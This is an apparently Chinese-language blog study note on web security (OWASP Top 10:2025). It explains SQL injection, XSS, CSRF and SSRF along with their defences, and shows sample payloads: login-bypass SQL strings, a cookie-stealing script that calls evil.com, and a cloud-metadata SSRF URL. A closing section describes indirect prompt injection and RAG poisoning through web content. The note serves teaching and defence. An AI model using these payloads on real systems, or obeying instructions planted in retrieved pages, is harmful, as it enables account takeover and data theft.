@@ -1,0 +1,1169 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="KachaKacha">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Web 安全基础（Web Security） 定位：OWASP Top 10（SQL 注入 &#x2F; XSS &#x2F; CSRF &#x2F; SSRF）是安全人的通用词汇表。你不需要成为渗透专家，但看到 payload 要知道它在干嘛——因为 LLM 安全的间接 prompt injection 常借 Web 页面注入。前置：模块 G（网络基础）｜ 后继：模块 K（LLM 安全）、M（红队）及格线：能解释 SQL 注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 安全基础（H 模块）">
+<meta property="og:url" content="https://happy-clown123.github.io/2026/08/31/H-web/index.html">
+<meta property="og:site_name" content="KachaKacha的空间">
+<meta property="og:description" content="Web 安全基础（Web Security） 定位：OWASP Top 10（SQL 注入 &#x2F; XSS &#x2F; CSRF &#x2F; SSRF）是安全人的通用词汇表。你不需要成为渗透专家，但看到 payload 要知道它在干嘛——因为 LLM 安全的间接 prompt injection 常借 Web 页面注入。前置：模块 G（网络基础）｜ 后继：模块 K（LLM 安全）、M（红队）及格线：能解释 SQL 注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://happy-clown123.github.io/images/core/sqli-flow.svg">
+<meta property="og:image" content="https://happy-clown123.github.io/images/core/xss-types.svg">
+<meta property="article:published_time" content="2026-08-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-31T08:17:01.678Z">
+<meta property="article:author" content="KachaKacha">
+<meta property="article:tag" content="OWASP">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://happy-clown123.github.io/images/core/sqli-flow.svg">
+  
+  
+  
+  <title>Web 安全基础（H 模块） - KachaKacha的空间</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"happy-clown123.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Web 安全基础（H 模块）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-31 00:00" pubdate>
+          2026年8月31日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Web 安全基础（H 模块）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Web-安全基础（Web-Security）"><a href="#Web-安全基础（Web-Security）" class="headerlink" title="Web 安全基础（Web Security）"></a>Web 安全基础（Web Security）</h1><blockquote>
+<p>定位：OWASP Top 10（SQL 注入 / XSS / CSRF / SSRF）是安全人的通用词汇表。你不需要成为渗透专家，但<strong>看到 payload 要知道它在干嘛</strong>——因为 LLM 安全的间接 prompt injection 常借 Web 页面注入。<br>前置：模块 G（网络基础）｜ 后继：模块 K（LLM 安全）、M（红队）<br>及格线：能解释 SQL 注入怎么让数据库返回不该返回的数据（h01 对照实验）；能说出 OWASP Top 10:2025 前 3 名；说清存储型 XSS 与间接注入的继承关系。</p>
+</blockquote>
+<hr>
+<h2 id="0-学习执行清单"><a href="#0-学习执行清单" class="headerlink" title="0 学习执行清单"></a>0 学习执行清单</h2><table>
+<thead>
+<tr>
+<th>#</th>
+<th>这一步干什么</th>
+<th>主资源（定位到位置）</th>
+<th>动手产出</th>
+<th>过关判据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>OWASP Top 10:2025 全表 + 重点两类</td>
+<td>本笔记 §1 + <a target="_blank" rel="noopener" href="https://owasp.org/Top10/">OWASP 官网</a></td>
+<td>默写前 5 名</td>
+<td>能说出 Injection 从 #3 降到 #5、Supply Chain 新增</td>
+</tr>
+<tr>
+<td>2</td>
+<td>SQL 注入机制 + 参数化防御</td>
+<td>本笔记 §2 + <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">PortSwigger SQLi Lab</a></td>
+<td>跑 <code>labs/h01_sqli_xss_demo.py</code> 的 SQLi 部分</td>
+<td>能手推 <code>' OR 1=1 --</code> 的 SQL 展开</td>
+</tr>
+<tr>
+<td>3</td>
+<td>XSS 三型 + 转义/CSP/HttpOnly</td>
+<td>本笔记 §3 + PortSwigger XSS Labs</td>
+<td>跑 h01 的 XSS 部分</td>
+<td>能说出存储型为什么最危险；<code>v-html</code>/<code>innerHTML</code> 的坑</td>
+</tr>
+<tr>
+<td>4</td>
+<td>CSRF 机制与 SameSite/Token 防御</td>
+<td>本笔记 §4 + PortSwigger CSRF Lab</td>
+<td>一段话原理</td>
+<td>能说出”借的是浏览器自动带 Cookie”</td>
+</tr>
+<tr>
+<td>5</td>
+<td>SSRF 与云元数据攻击</td>
+<td>本笔记 §5</td>
+<td>画攻击链路</td>
+<td>能说出为什么 169.254.169.254 要禁</td>
+</tr>
+<tr>
+<td>6</td>
+<td>接上 K：Web 注入 ↔ LLM 注入</td>
+<td>本笔记 §7 + 模块 K §3</td>
+<td>一段继承关系分析</td>
+<td>能说出”存储型 XSS 载体 ≈ 间接注入载体”</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="1-OWASP-Top-10：标准已更新到-2025-版"><a href="#1-OWASP-Top-10：标准已更新到-2025-版" class="headerlink" title="1 OWASP Top 10：标准已更新到 2025 版"></a>1 OWASP Top 10：标准已更新到 2025 版</h2><p>你路线文档里引用的是 2021 版。最新是 <strong>OWASP Top 10:2025</strong>（2021 后首次大改）。两版都要知道，但 2025 是当下标准：</p>
+<table>
+<thead>
+<tr>
+<th>2025 版</th>
+<th>名称</th>
+<th>相对 2021 的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A01:2025</td>
+<td>Broken Access Control</td>
+<td>仍居首；<strong>并入 SSRF、BOLA、BFLA</strong>（API 授权失败）</td>
+</tr>
+<tr>
+<td>A02:2025</td>
+<td>Security Misconfiguration</td>
+<td>从 #5 升到 #2</td>
+</tr>
+<tr>
+<td>A03:2025</td>
+<td>Software Supply Chain Failures</td>
+<td><strong>新增</strong>（由”过时组件”扩写）</td>
+</tr>
+<tr>
+<td>A04:2025</td>
+<td>Cryptographic Failures</td>
+<td>从 #2 降到 #4</td>
+</tr>
+<tr>
+<td>A05:2025</td>
+<td>Injection</td>
+<td>从 #3 降到 #5（仍含 SQLi / XSS）</td>
+</tr>
+<tr>
+<td>A06:2025</td>
+<td>Insecure Design</td>
+<td>—</td>
+</tr>
+<tr>
+<td>A07:2025</td>
+<td>Authentication Failures</td>
+<td>—</td>
+</tr>
+<tr>
+<td>A08:2025</td>
+<td>Software or Data Integrity Failures</td>
+<td>—</td>
+</tr>
+<tr>
+<td>A09:2025</td>
+<td>Logging &amp; Alerting Failures</td>
+<td>—</td>
+</tr>
+<tr>
+<td>A10:2025</td>
+<td>Mishandling of Exceptional Conditions</td>
+<td><strong>新增</strong></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>作为 AI 安全研究者，你重点掌握 <strong>Injection 类（SQLi/XSS）</strong> 和 <strong>SSRF / 访问控制</strong>，其余混个脸熟即可。下面专讲这几类。</p>
+</blockquote>
+<h2 id="2-SQL-注入：最经典的注入"><a href="#2-SQL-注入：最经典的注入" class="headerlink" title="2 SQL 注入：最经典的注入"></a>2 SQL 注入：最经典的注入</h2><p><img src="/images/core/sqli-flow.svg" srcset="/img/loading.gif" lazyload></p>
+<p>核心：用户输入被<strong>直接拼进 SQL 字符串</strong>，使得输入从”数据”变成”代码”。</p>
+<p>为什么 <code>' OR 1=1 --</code> 能绕过登录？</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 后端拼接：SELECT * FROM users WHERE username='&lt;输入&gt;' AND password='&lt;输入&gt;'</span><br><span class="hljs-comment">-- 输入用户名：admin' OR '1'='1</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">'admin'</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">'1'</span><span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">'***'</span><br></code></pre></td></tr></table></figure>
+<p><code>'1'='1'</code> 恒为真，<code>OR</code> 让它前面的条件失效 → 整条 WHERE 恒真 → 不需要正确密码也能登录（取决于拼接位置，可能还会拖出整张表）。<code>--</code> 是 SQL 注释，用来吃掉后面的 <code>' AND password=...</code>。</p>
+<p><strong>防御（永远用这个）</strong>：参数化查询 / 预编译，让输入永远是占位符的值：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 错误：字符串拼接</span><br>cur.execute(<span class="hljs-string">"SELECT * FROM users WHERE username='"</span> + user + <span class="hljs-string">"' AND password='"</span> + pw + <span class="hljs-string">"'"</span>)<br><br><span class="hljs-comment"># 正确：参数化（? 占位符，驱动负责转义）</span><br>cur.execute(<span class="hljs-string">"SELECT * FROM users WHERE username=? AND password=?"</span>, (user, pw))<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-XSS：在别人浏览器里跑你的-JS"><a href="#3-XSS：在别人浏览器里跑你的-JS" class="headerlink" title="3 XSS：在别人浏览器里跑你的 JS"></a>3 XSS：在别人浏览器里跑你的 JS</h2><p><img src="/images/core/xss-types.svg" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><strong>反射型</strong>：payload 在 URL 里，服务器把它原样拼回响应 HTML，用户一点击就执行。不经存储。</li>
+<li><strong>存储型</strong>：payload 提交到服务器存库（评论/昵称），其他用户访问时从库取出执行。<strong>最危险、最持久</strong>。</li>
+<li><strong>DOM 型</strong>：payload 在客户端 JS 里被 <code>innerHTML</code> 等方式直接写入 DOM，响应源码里看不到，漏洞在 JS。</li>
+</ul>
+<p>典型 payload：<code>&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</code> → 偷 Cookie。</p>
+<p><strong>防御</strong>：</p>
+<ul>
+<li>输出到 HTML 时做<strong>上下文转义</strong>（HTML 实体 / JS 转义）。</li>
+<li>设 <strong>CSP</strong>（Content-Security-Policy）限制脚本来源。</li>
+<li>Cookie 加 <code>HttpOnly</code> 防止 JS 读取。</li>
+<li>框架（React/Vue）默认转义，但 <code>dangerouslySetInnerHTML</code> / <code>v-html</code> 会绕过——这是 AI 应用里的常见坑。</li>
+</ul>
+<h2 id="4-CSRF：借你的身份发请求"><a href="#4-CSRF：借你的身份发请求" class="headerlink" title="4 CSRF：借你的身份发请求"></a>4 CSRF：借你的身份发请求</h2><p><strong>原理</strong>：你已登录 <code>bank.com</code>，浏览器持有合法会话 Cookie。攻击者页面偷偷发 <code>POST /transfer?to=attacker&amp;amt=1000</code>，浏览器自动带上 Cookie → 银行以为是你自己发的。</p>
+<p><strong>防御</strong>：</p>
+<ul>
+<li><strong>CSRF Token</strong>：服务端下发随机 token，敏感请求必须带上，攻击者拿不到。</li>
+<li><strong>SameSite Cookie</strong>：设 <code>SameSite=Lax/Strict</code>，跨站请求不带 Cookie。</li>
+<li>关键操作要求重新认证（二次密码/短信）。</li>
+</ul>
+<h2 id="5-SSRF：让服务器替你打内网"><a href="#5-SSRF：让服务器替你打内网" class="headerlink" title="5 SSRF：让服务器替你打内网"></a>5 SSRF：让服务器替你打内网</h2><p><strong>原理</strong>：服务端根据用户输入去抓一个 URL（如”导入头像 URL”），攻击者可传 <code>http://169.254.169.254/latest/meta-data/</code>（云元数据接口）或内网地址，让服务器访问本不允许外网碰的资源。</p>
+<p><strong>防御</strong>：</p>
+<ul>
+<li>白名单协议（只允许 https）与域名；禁止 <code>169.254.169.254</code>、内网 CIDR。</li>
+<li>出网请求走隔离网络 + 禁用重定向跟随。</li>
+<li>2025 版已把 SSRF 并入 A01 Broken Access Control。</li>
+</ul>
+<h2 id="6-文件上传漏洞（扫盲）"><a href="#6-文件上传漏洞（扫盲）" class="headerlink" title="6 文件上传漏洞（扫盲）"></a>6 文件上传漏洞（扫盲）</h2><ul>
+<li>传 <code>.php</code>/<code>.jsp</code> 木马 → 直接 getshell；传恶意外壳图 → 解析漏洞执行。</li>
+<li>防御：限制后缀白名单、重命名、存在非执行目录、校验真实 MIME、隔离存储。</li>
+</ul>
+<h2 id="7-和-AI-安全的连接点（核心）"><a href="#7-和-AI-安全的连接点（核心）" class="headerlink" title="7 和 AI 安全的连接点（核心）"></a>7 和 AI 安全的连接点（核心）</h2><ul>
+<li><strong>间接 prompt injection</strong>：攻击者把恶意指令藏在网页/评论（常借<strong>存储型 XSS 的载体</strong>）里，LLM 检索到这段内容后被执行 → 这就是 Web 漏洞和 LLM 安全的交叉。</li>
+<li><strong>RAG 投毒</strong>：往知识库（可能来自爬取的 Web 页面）注入恶意文本 → 本质是”把 Web 注入搬进 LLM 上下文”。</li>
+<li><strong>OWASP LLM Top 10</strong> 的分类（如 LLM01 Prompt Injection、LLM02 敏感信息泄露）在方法论上继承自 Web Top 10——你懂 Web 注入，就懂 LLM 注入的”为什么危险”。</li>
+<li>你跑红队（模块 M）扫描 LLM 服务时，很多 payload 就是 HTTP 表单/JSON 里的注入字符串。</li>
+</ul>
+<h2 id="8-实验清单（Labs）"><a href="#8-实验清单（Labs）" class="headerlink" title="8 实验清单（Labs）"></a>8 实验清单（Labs）</h2><table>
+<thead>
+<tr>
+<th>Lab</th>
+<th>目标</th>
+<th>脚本</th>
+<th>依赖</th>
+<th>硬件/成本</th>
+<th>过关判据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>h01</td>
+<td>注入双演示：SQLi 拼接 vs 参数化（sqlite3）+ XSS 转义 vs 不转义（html.escape）</td>
+<td><code>labs/h01_sqli_xss_demo.py</code></td>
+<td>Python 标准库</td>
+<td>CPU，秒级</td>
+<td>SQLi 部分：拼接命中全部/参数化命中 0；XSS 部分：不转义可注入/转义后原样显示</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 02-security/web/labs<br>python h01_sqli_xss_demo.py<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>进阶靶场（可选）：PortSwigger Web Security Academy 免费 labs；DVWA 用 Docker 本地起。都做官方题即可，不用全刷。</p>
+</blockquote>
+<h2 id="9-常见误区"><a href="#9-常见误区" class="headerlink" title="9 常见误区"></a>9 常见误区</h2><ol>
+<li><strong>以为”用户输入过滤一下（黑名单）就安全了”</strong> —— 黑名单永远不完整（编码、大小写、注释变体无数）；SQL 注入的正解是<strong>参数化查询</strong>（结构上隔离），不是过滤。</li>
+<li><strong>以为参数化查询”只是转义”</strong> —— 是编译期把 SQL 结构固定、输入只当数据绑定，攻击者在结构上无路可走。</li>
+<li><strong>以为 XSS 只是”弹个窗”</strong> —— 存储型 XSS + 管理员 Cookie = 接管后台；现代危害是<strong>窃取会话 + 键盘记录 + 借浏览器打内网</strong>（beef 框架的玩法）。</li>
+<li><strong>以为 HTTPS 能防 XSS/CSRF</strong> —— HTTPS 防传输窃听，不防应用层注入；XSS/CSRF 在应用层，TLS 无能为力。</li>
+<li><strong>以为 LLM 应用没有 Web 漏洞</strong> —— LLM 应用是 Web 应用：前端、API、存储全在；<code>v-html</code>/<code>innerHTML</code> 渲染模型输出 = 存储型 XSS 的新载体（对应 LLM05 Improper Output Handling）。</li>
+</ol>
+<h2 id="10-检查点（自测）"><a href="#10-检查点（自测）" class="headerlink" title="10 检查点（自测）"></a>10 检查点（自测）</h2><ul>
+<li><input disabled="" type="checkbox"> SQL 注入的 <code>' OR 1=1 --</code> 为什么能绕过登录？参数化查询怎么挡住它？</li>
+<li><input disabled="" type="checkbox"> XSS 的反射型 vs 存储型区别？各举一例；<code>v-html</code>/<code>innerHTML</code> 为什么是坑</li>
+<li><input disabled="" type="checkbox"> CSRF 借的是什么机制？SameSite / CSRF Token 怎么防？</li>
+<li><input disabled="" type="checkbox"> SSRF 为什么能打到云元数据接口？怎么防御？</li>
+<li><input disabled="" type="checkbox"> 间接 prompt injection 和 Web 注入（尤其存储型 XSS）有什么继承关系？</li>
+<li><input disabled="" type="checkbox"> 跑通 h01，贴出拼接/参数化命中行数对照与转义前后对照</li>
+</ul>
+<p><strong>及格线</strong>：能解释 SQL 注入怎么让数据库返回不该返回的数据；能说出 OWASP Top 10:2025 前 3 名（Broken Access Control / Security Misconfiguration / Supply Chain Failures）。</p>
+<p><strong>资源</strong>：OWASP Top 10（2025 官网）；PortSwigger Web Security Academy（免费 labs，含 LLM Attacks）；《白帽子讲 Web 安全》；DVWA 靶场（Docker 本地起）。</p>
+<h2 id="11-与主线的连接"><a href="#11-与主线的连接" class="headerlink" title="11 与主线的连接"></a>11 与主线的连接</h2><ul>
+<li><strong>→ 模块 K §3 prompt injection</strong>：间接注入常借<strong>存储型 XSS 的载体</strong>（网页/评论）——LLM 检索到恶意文本后执行，等于”Web 注入搬进 LLM 上下文”。</li>
+<li><strong>→ 模块 K §2 LLM05</strong>：模型输出未校验直接进前端渲染（<code>v-html</code>）＝存储型 XSS 的 AI 版；输出必须当不可信输入处理。</li>
+<li><strong>→ 模块 K §5 RAG 投毒</strong>：知识库若来自爬取的 Web 页面，网页注入直接变成 RAG 毒文档。</li>
+<li><strong>→ 模块 J §6 防御</strong>：Web 的”输入校验/输出编码”哲学与对抗样本的”输入隔离”同源——都是”不要信输入”。</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/AI%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" class="category-chain-item">AI安全学习</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/AI%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="category-chain-item">安全基础</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/AI%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+        <a href="/tags/OWASP/" class="print-no-link">#OWASP</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+        <a href="/tags/XSS/" class="print-no-link">#XSS</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
